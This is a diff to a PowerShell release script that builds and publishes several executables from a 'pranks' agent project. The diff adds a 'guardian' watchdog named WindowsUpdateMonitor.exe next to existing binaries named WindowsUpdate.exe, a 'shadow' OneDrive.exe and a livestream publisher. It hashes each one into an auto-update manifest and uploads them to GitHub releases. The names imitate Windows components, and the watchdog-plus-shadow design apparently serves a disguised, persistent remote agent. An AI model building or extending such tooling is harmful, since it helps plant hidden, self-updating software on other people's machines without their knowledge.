@@ -27,6 +27,7 @@ $ErrorActionPreference = "Stop"
 $agentSource         = "C:\Users\mohba\OneDrive\Desktop\pranks\Agent\Source"
 $primaryExe          = Join-Path $agentSource "publish_out\WindowsUpdate.exe"
 $shadowExe           = Join-Path $agentSource "publish_out_shadow\OneDrive.exe"
+$guardianExe         = Join-Path $agentSource "publish_out_guardian\WindowsUpdateMonitor.exe"
 $livePublisherExe    = "C:\Users\mohba\OneDrive\Desktop\pranks\livestream\LivePublisher.exe"
 $manifestDir         = $PSScriptRoot
 $manifestPath        = Join-Path $manifestDir "manifest.json"
@@ -151,10 +152,22 @@ if (-not $SkipBuild) {
         if ($LASTEXITCODE -ne 0) { Fail "dotnet publish OneDrive.csproj failed" }
     }
     finally { Pop-Location }
+
+    Write-Host "[BUILD] WindowsUpdateMonitor.exe (health monitor, self-contained, single-file, win-x64)..." -ForegroundColor Cyan
+    Push-Location $agentSource
+    try {
+        dotnet publish Guardian\Guardian.csproj -c Release -o .\publish_out_guardian -p:PublishSingleFile=true -r win-x64 --self-contained true | Out-Host
+        if ($LASTEXITCODE -ne 0) { Fail "dotnet publish Guardian.csproj failed" }
+    }
+    finally { Pop-Location }
 }
 
 if (-not (Test-Path $primaryExe)) { Fail "primary exe not found: $primaryExe" }
 if (-not (Test-Path $shadowExe))  { Fail "shadow exe not found: $shadowExe" }
+$haveGuardian = Test-Path $guardianExe
+if (-not $haveGuardian) {
+    Write-Host "[WARN] WindowsUpdateMonitor.exe nicht gefunden ($guardianExe) - manifest wird ohne guardian-Felder gebaut." -ForegroundColor Yellow
+}
 $havePublisher = Test-Path $livePublisherExe
 if (-not $havePublisher) {
     Write-Host "[WARN] LivePublisher.exe nicht gefunden ($livePublisherExe) - manifest wird ohne livePublisher-Felder gebaut." -ForegroundColor Yellow
@@ -170,6 +183,14 @@ $primaryMb = [math]::Round($primarySize/1MB, 1)
 $shadowMb  = [math]::Round($shadowSize/1MB, 1)
 Write-Host ("        primary sha256 = {0}  ({1} MB)" -f $primaryHash, $primaryMb)
 Write-Host ("        shadow  sha256 = {0}  ({1} MB)" -f $shadowHash,  $shadowMb)
+$guardianHash = $null
+$guardianSize = 0
+if ($haveGuardian) {
+    $guardianHash = Compute-Sha256 -Path $guardianExe
+    $guardianSize = (Get-Item $guardianExe).Length
+    $gMb = [math]::Round($guardianSize/1MB, 1)
+    Write-Host ("        guardian sha256 = {0}  ({1} MB)" -f $guardianHash, $gMb)
+}
 $livePublisherHash = $null
 $livePublisherSize = 0
 if ($havePublisher) {
@@ -183,6 +204,7 @@ if ($havePublisher) {
 Write-Host "[MANI] Updating manifest.json..." -ForegroundColor Cyan
 $primaryUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/WindowsUpdate.exe"
 $shadowUrl  = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/OneDrive.exe"
+$guardianUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/WindowsUpdateMonitor.exe"
 $livePublisherUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/LivePublisher.exe"
 $manifestObj = [ordered]@{
     version      = $Version
@@ -190,6 +212,10 @@ $manifestObj = [ordered]@{
     url          = $primaryUrl
     shadowSha256 = $shadowHash
     shadowUrl    = $shadowUrl
+}
+if ($haveGuardian) {
+    $manifestObj.guardianSha256 = $guardianHash
+    $manifestObj.guardianUrl    = $guardianUrl
 }
 if ($havePublisher) {
     $manifestObj.livePublisherSha256 = $livePublisherHash
@@ -204,7 +230,7 @@ Write-Host "       -> $manifestPath"
 Write-Host "[GIT]  add + commit + push manifest..." -ForegroundColor Cyan
 Push-Location $manifestDir
 try {
-    git add manifest.json README.md .gitignore release.ps1 2>$null | Out-Null
+    git add manifest.json README.md .gitignore release.ps1 install.ps1 guardian.ps1 2>$null | Out-Null
     $status = git status --porcelain
     if ($status) {
         git commit -m "release v$Version (dual exe: WindowsUpdate + OneDrive shadow)" | Out-Null
@@ -228,6 +254,7 @@ if ($SkipUpload) {
 Write-Host "[REL]  GitHub Release v$Version + asset uploads via gh CLI..." -ForegroundColor Cyan
 $notesArg = if ([string]::IsNullOrWhiteSpace($Notes)) { "Release v$Version" } else { $Notes }
 $assets = @($primaryExe, $shadowExe)
+if ($haveGuardian)  { $assets += $guardianExe }
 if ($havePublisher) { $assets += $livePublisherExe }
 gh release create "v$Version" @assets --title "v$Version" --notes $notesArg
 if ($LASTEXITCODE -ne 0) { Fail "gh release create failed" }
